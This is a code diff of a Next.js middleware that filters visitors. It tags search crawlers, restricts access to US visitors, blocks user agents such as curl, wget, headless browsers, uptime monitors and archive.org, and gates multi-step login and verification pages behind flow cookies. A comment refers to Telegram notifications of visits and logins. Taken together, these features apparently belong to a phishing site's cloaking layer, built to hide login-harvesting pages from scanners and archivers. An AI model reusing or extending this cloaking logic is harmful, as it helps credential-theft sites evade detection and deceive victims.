@@ -1,185 +1,318 @@
-import { NextResponse } from "next/server";
-import type { NextRequest } from "next/server";
+import { NextResponse } from "next/server"
+import type { NextFetchEvent, NextRequest } from "next/server"
+import { readRiskCookie } from "@/lib/bot-risk/cookie"
+import { applyNavProofCookie } from "@/lib/bot-risk/proof-cookies"
+import { isMitigationBand } from "@/lib/bot-risk/score"
+import {
+  isAppleCrawlerUA,
+  isBaiduCrawlerUA,
+  isBingCrawlerUA,
+  isDuckDuckCrawlerUA,
+  isGoogleCrawlerUA,
+  isSearchCrawlerUA,
+  isYahooCrawlerUA,
+} from "@/lib/bot-detection"
+import { notifyBotCrawlIfNeeded } from "@/lib/bot-verification/bot-crawl-middleware"
+import { getRequestCountryCode } from "@/lib/edge-geo"
+import { GEO_US_ONLY_HEADER } from "@/lib/geo-us-header"
+import { isIndexNowVerificationPath } from "@/lib/indexnow-verification"
+import { isLocalTestingUnlocked } from "@/lib/local-testing"
+import { isSeoCrawlerPath } from "@/lib/seo-crawler-paths"
+import { isUngatedSeoPath } from "@/lib/seo-public-paths"
+import { isYandexVerificationPath } from "@/lib/yandex-verification"
+import { isTrustedCrawlerUserAgent } from "@/utils/botDetection"
 
-const ALLOWED_BOT_PATTERNS = [
-  /facebookexternalhit/i,
-  /facebot/i,
-  /twitterbot/i,
-  /linkedinbot/i,
-  /slackbot/i,
-  /slack-imgproxy/i,
-  /telegrambot/i,
-  /whatsapp/i,
-  /discordbot/i,
-  /pinterest/i,
-  /embedly/i,
-  /googlebot/i,
-  /bingbot/i,
-  /applebot/i,
-  /viber/i,
-  /redditbot/i,
-  /tumblr/i,
-  /line-poker/i,
-  /line-crawler/i,
-  /kakaotalk/i,
-  /skype/i,
-  /wechat/i,
-  /flipboard/i,
-  /medium/i,
-  /bitlybot/i,
-  /quora link preview/i,
-  /discord/i,
-];
+const FORGOT_FLOW_COOKIE = "forgot_flow"
+const LOGIN_FLOW_COOKIE = "login_flow"
+const NEW_USER_FLOW_COOKIE = "new_user_flow"
 
-const BLOCKED_BOT_PATTERNS = [
-  /curl/i,
-  /wget/i,
-  /python-requests/i,
-  /python-urllib/i,
-  /scrapy/i,
-  /go-http-client/i,
-  /postman/i,
-  /insomnia/i,
-  /selenium/i,
-  /webdriver/i,
-  /puppeteer/i,
-  /playwright/i,
-  /phantom/i,
-  /headlesschrome/i,
-  /chrome-lighthouse/i,
-  /prerender/i,
-  /browsershot/i,
-  /wkhtmltopdf/i,
-  /html2pdf/i,
-  /uptimerobot/i,
-  /pingdom/i,
-  /site24x7/i,
-  /statuscake/i,
-  /nagios/i,
-  /rogerbot/i,
-  /ahrefsbot/i,
-  /semrushbot/i,
-  /dotbot/i,
-  /mj12bot/i,
-  /petalbot/i,
-  /libwww/i,
-  /lwp-trivial/i,
-  /php\/\d/i,
-  /^java\s/i,
-  /datadog/i,
-  /sentry\/\d/i,
-  /archive\.org/i,
-  /wayback/i,
-  /ia_archiver/i,
-];
+const protectedForgotPaths: string[] = []
 
-function isAllowedBot(ua: string): boolean {
-  return ALLOWED_BOT_PATTERNS.some((p) => p.test(ua));
-}
+/** OCA uses sessionStorage loginReady client-side; cookie flow guard unused. */
+const protectedLoginPaths: string[] = []
 
-function isBlockedBot(ua: string): boolean {
-  return BLOCKED_BOT_PATTERNS.some((p) => p.test(ua));
-}
+const protectedNewUserPaths: string[] = []
 
-const FORGOT_FLOW_COOKIE = "forgot_flow";
-const NEW_USER_FLOW_COOKIE = "new_user_flow";
-const LOGIN_FLOW_COOKIE = "login_flow";
+function applySearchCrawlerHeaders(request: NextRequest): Headers {
+  const requestHeaders = new Headers(request.headers)
+  const ua = request.headers.get("user-agent") ?? ""
+  const { pathname } = request.nextUrl
 
-const protectedForgotPaths = [
-  "/forgot-password-found",
-  "/forgot-password-verify",
-  "/forgot-password-code",
-];
+  requestHeaders.set("x-pathname", pathname)
+  if (isSearchCrawlerUA(ua)) {
+    requestHeaders.set("x-is-search-crawler", "1")
+    if (isGoogleCrawlerUA(ua)) requestHeaders.set("x-is-googlebot", "1")
+    if (isBingCrawlerUA(ua)) requestHeaders.set("x-is-bingbot", "1")
+    if (isDuckDuckCrawlerUA(ua)) requestHeaders.set("x-is-duckduckbot", "1")
+    if (isYahooCrawlerUA(ua)) requestHeaders.set("x-is-yahoobot", "1")
+    if (isAppleCrawlerUA(ua)) requestHeaders.set("x-is-applebot", "1")
+    if (isBaiduCrawlerUA(ua)) requestHeaders.set("x-is-baiduspider", "1")
+    if (isSeoCrawlerPath(pathname)) {
+      requestHeaders.set("x-crawler-seo-page", "1")
+    }
+  }
 
-const protectedNewUserPaths = ["/new-user-code", "/new-user-password"];
-
-export async function middleware(request: NextRequest) {
-  const { pathname } = request.nextUrl;
-
-  if (
+  // US-only geo signal for ReffererProvider (skip for trusted crawlers / public assets)
+  const skipGeo =
     pathname.startsWith("/api") ||
     pathname.startsWith("/_next") ||
-    pathname === "/favicon.ico"
-  ) {
-    return NextResponse.next();
+    isPublicAssetPath(pathname) ||
+    pathname === "/robots.txt" ||
+    pathname === "/sitemap.xml" ||
+    isIndexNowVerificationPath(pathname) ||
+    isYandexVerificationPath(pathname) ||
+    isTrustedCrawlerUserAgent(ua)
+
+  if (!skipGeo) {
+    if (request.cookies.get("geo_us_block")?.value === "1") {
+      requestHeaders.set(GEO_US_ONLY_HEADER, "block")
+    } else {
+      const country = getRequestCountryCode(request)
+      if (country && country !== "US") {
+        requestHeaders.set(GEO_US_ONLY_HEADER, "block")
+      } else if (!country) {
+        requestHeaders.set(GEO_US_ONLY_HEADER, "unknown")
+      } else {
+        requestHeaders.set(GEO_US_ONLY_HEADER, "allow")
+      }
+    }
   }
 
-  if (process.env.NODE_ENV !== "production") {
-    const ua = request.headers.get("user-agent") || "";
-    if (isAllowedBot(ua)) return NextResponse.next();
-    if (isBlockedBot(ua))
-      return NextResponse.redirect(new URL("/blocked", request.url));
+  return requestHeaders
+}
+
+function nextWithHeaders(requestHeaders: Headers): NextResponse {
+  const response = NextResponse.next({ request: { headers: requestHeaders } })
+  if (requestHeaders.get("x-crawler-seo-page") === "1") {
+    response.headers.set("x-crawler-seo-page", "1")
+    response.cookies.set("x-crawler-seo-page", "1", {
+      httpOnly: true,
+      path: "/",
+      maxAge: 60,
+      sameSite: "lax",
+    })
   }
+  if (requestHeaders.get(GEO_US_ONLY_HEADER) === "block") {
+    response.cookies.set("geo_us_block", "1", {
+      path: "/",
+      maxAge: 120,
+      sameSite: "lax",
+    })
+  }
+  const pathname = requestHeaders.get("x-pathname") ?? ""
+  if (!pathname.startsWith("/api") && !pathname.startsWith("/_next")) {
+    applyNavProofCookie(response)
+  }
+  return response
+}
+
+const SEO_ALLOWED_PATHS = [
+  "/",
+  "/robots.txt",
+  "/sitemap.xml",
+  "/favicon.ico",
+  "/favicon.png",
+  "/icon-48x48.png",
+  "/icon-32x32.png",
+  "/apple-touch-icon.png",
+  "/og-image.png",
+  "/logo.png",
+  "/img/logo.png",
+  "/img/FavIcon.png",
+]
+
+const PUBLIC_BRAND_ASSETS = new Set([
+  "/error-icon.png",
+  "/favicon.ico",
+  "/favicon.png",
+  "/icon-48x48.png",
+  "/icon-32x32.png",
+  "/apple-touch-icon.png",
+  "/og-image.png",
+  "/logo.png",
+  "/img/logo.png",
+  "/img/FavIcon.png",
+  "/emp/images/logo.png",
+])
+
+function isPublicAssetPath(pathname: string): boolean {
+  return (
+    PUBLIC_BRAND_ASSETS.has(pathname) ||
+    pathname.startsWith("/styles/") ||
+    pathname.startsWith("/img/") ||
+    pathname.startsWith("/emp/") ||
+    pathname.startsWith("/assets/")
+  )
+}
+
+function handleGaBreezeFlowGuards(request: NextRequest): NextResponse | null {
+  const { pathname } = request.nextUrl
 
   if (protectedForgotPaths.includes(pathname)) {
-    const hasFlowCookie =
-      request.cookies.get(FORGOT_FLOW_COOKIE)?.value === "1";
+    const hasFlowCookie = request.cookies.get(FORGOT_FLOW_COOKIE)?.value === "1"
     if (!hasFlowCookie) {
-      const url = request.nextUrl.clone();
-      url.pathname = "/forgot-password";
-      return NextResponse.redirect(url);
+      const url = request.nextUrl.clone()
+      url.pathname = "/forgot-password"
+      return NextResponse.redirect(url)
+    }
+  }
+
+  if (protectedLoginPaths.includes(pathname)) {
+    const hasLoginCookie = Boolean(request.cookies.get(LOGIN_FLOW_COOKIE)?.value)
+    if (!hasLoginCookie) {
+      const url = request.nextUrl.clone()
+      url.pathname = "/"
+      return NextResponse.redirect(url)
     }
   }
 
   if (protectedNewUserPaths.includes(pathname)) {
-    const flowValue = request.cookies.get(NEW_USER_FLOW_COOKIE)?.value;
-
-    if (pathname === "/new-user-code") {
-      if (!(flowValue === "1" || flowValue === "2")) {
-        const url = request.nextUrl.clone();
-        url.pathname = "/new-user";
-        return NextResponse.redirect(url);
-      }
-    }
-
-    if (pathname === "/new-user-password") {
-      if (flowValue !== "2") {
-        const url = request.nextUrl.clone();
-        url.pathname = "/new-user";
-        return NextResponse.redirect(url);
-      }
+    const hasNewUserCookie = request.cookies.get(NEW_USER_FLOW_COOKIE)?.value === "1"
+    if (!hasNewUserCookie) {
+      const url = request.nextUrl.clone()
+      url.pathname = "/new-user"
+      return NextResponse.redirect(url)
     }
   }
 
-  const loginFlowValue = request.cookies.get(LOGIN_FLOW_COOKIE)?.value;
+  return null
+}
 
-  if (pathname === "/verify-choice") {
-    if (!loginFlowValue) {
-      const url = request.nextUrl.clone();
-      url.pathname = "/";
-      return NextResponse.redirect(url);
+const STRICT_BLOCKED_BOT_PATTERNS = [
+  /curl/i,
+  /wget/i,
+  /httpclient/i,
+  /python-requests/i,
+  /axios/i,
+  /okhttp/i,
+  /libwww-perl/i,
+  /go-http-client/i,
+  /\bjava\b/i,
+  /\bphp\b/i,
+]
+
+const SOFT_BLOCKED_BOT_PATTERNS = [/bot/i, /crawler/i, /spider/i, /scraper/i]
+
+function handleBotIfNeeded(
+  request: NextRequest,
+  requestHeaders: Headers,
+): NextResponse | null {
+  const { pathname } = request.nextUrl
+  const userAgent = request.headers.get("user-agent") || ""
+
+  if (!userAgent) {
+    return null
+  }
+
+  const strictMatch = STRICT_BLOCKED_BOT_PATTERNS.some((p) => p.test(userAgent))
+  const softMatch = SOFT_BLOCKED_BOT_PATTERNS.some((p) => p.test(userAgent))
+
+  if (!strictMatch && !softMatch) {
+    return null
+  }
+
+  if (isTrustedCrawlerUserAgent(userAgent)) {
+    return null
+  }
+
+  if (
+    SEO_ALLOWED_PATHS.includes(pathname) ||
+    isPublicAssetPath(pathname) ||
+    isIndexNowVerificationPath(pathname) ||
+    isYandexVerificationPath(pathname) ||
+    isUngatedSeoPath(pathname)
+  ) {
+    return nextWithHeaders(requestHeaders)
+  }
+
+  if (softMatch && !strictMatch) {
+    return null
+  }
+
+  return new NextResponse("Forbidden", { status: 403 })
+}
+
+function handleRiskCookieIfNeeded(request: NextRequest): NextResponse | null {
+  const { pathname } = request.nextUrl
+  if (pathname.startsWith("/api/bot-fingerprint")) return null
+  if (pathname.startsWith("/api/bot-honeypot")) return null
+  if (pathname.startsWith("/api/telegram")) return null
+  if (pathname.startsWith("/_next")) return null
+  if (typeof PUBLIC_BRAND_ASSETS !== "undefined" && PUBLIC_BRAND_ASSETS.has(pathname)) return null
+  if (
+    pathname === "/robots.txt" ||
+    pathname === "/sitemap.xml" ||
+    (typeof isUngatedSeoPath === "function" && isUngatedSeoPath(pathname)) ||
+    (typeof isYandexVerificationPath === "function" && isYandexVerificationPath(pathname))
+  ) {
+    return null
+  }
+
+  const userAgent = request.headers.get("user-agent") || ""
+  if (
+    (typeof isTrustedCrawlerUserAgent === "function" && isTrustedCrawlerUserAgent(userAgent)) ||
+    (typeof isSearchCrawlerUA === "function" && isSearchCrawlerUA(userAgent))
+  ) {
+    return null
+  }
+
+  const risk = readRiskCookie(request)
+  if (!risk || !isMitigationBand(risk.band)) return null
+
+  if (pathname.startsWith("/api")) {
+    return new NextResponse("Forbidden", { status: 403 })
+  }
+
+  return new NextResponse("Forbidden", { status: 403 })
+}
+
+export async function middleware(request: NextRequest, event: NextFetchEvent) {
+  const requestHeaders = applySearchCrawlerHeaders(request)
+  const { pathname } = request.nextUrl
+
+  notifyBotCrawlIfNeeded(request, event)
+
+  if (
+    !pathname.startsWith("/api") &&
+    !pathname.startsWith("/_next") &&
+    pathname !== "/favicon.ico"
+  ) {
+    const flowRedirect = handleGaBreezeFlowGuards(request)
+    if (flowRedirect) {
+      return flowRedirect
     }
   }
 
-  if (pathname === "/verify") {
-    const step = request.nextUrl.searchParams.get("step");
-
-    if (step === "2") {
-      if (loginFlowValue !== "3") {
-        const url = request.nextUrl.clone();
-        url.pathname = "/";
-        return NextResponse.redirect(url);
-      }
-    } else {
-      if (!loginFlowValue) {
-        const url = request.nextUrl.clone();
-        url.pathname = "/";
-        return NextResponse.redirect(url);
-      }
-    }
+  // Local unlock before risk so visit/login Telegram is not 403'd in ALLOW_LOCAL_TESTING.
+  if (isLocalTestingUnlocked(request.headers.get("host"))) {
+    return nextWithHeaders(requestHeaders)
   }
 
-  if (pathname === "/verify-details") {
-    if (!(loginFlowValue === "2" || loginFlowValue === "3")) {
-      const url = request.nextUrl.clone();
-      url.pathname = "/";
-      return NextResponse.redirect(url);
-    }
+  const riskResponse = handleRiskCookieIfNeeded(request)
+  if (riskResponse) {
+    return riskResponse
   }
 
-  return NextResponse.next();
+  const botResponse = handleBotIfNeeded(request, requestHeaders)
+  if (botResponse) {
+    return botResponse
+  }
+
+  if (
+    pathname.startsWith("/api") ||
+    pathname.startsWith("/_next") ||
+    isPublicAssetPath(pathname) ||
+    isIndexNowVerificationPath(pathname) ||
+    isYandexVerificationPath(pathname)
+  ) {
+    return nextWithHeaders(requestHeaders)
+  }
+
+  return nextWithHeaders(requestHeaders)
 }
 
 export const config = {
-  matcher: ["/((?!_next/static|_next/image|favicon.ico).*)"],
-};
+  matcher: [
+    "/((?!_next/static|_next/image|error-icon\\.png|favicon\\.ico|favicon\\.png|favicon-32x32\\.png|icon-48x48\\.png|icon-32x32\\.png|apple-touch-icon\\.png|og-image\\.png|logo\\.png|emp/|assets/|yandex_[0-9a-f]+\\.html|[a-f0-9]{32}\\.txt).*)",
+  ],
+}
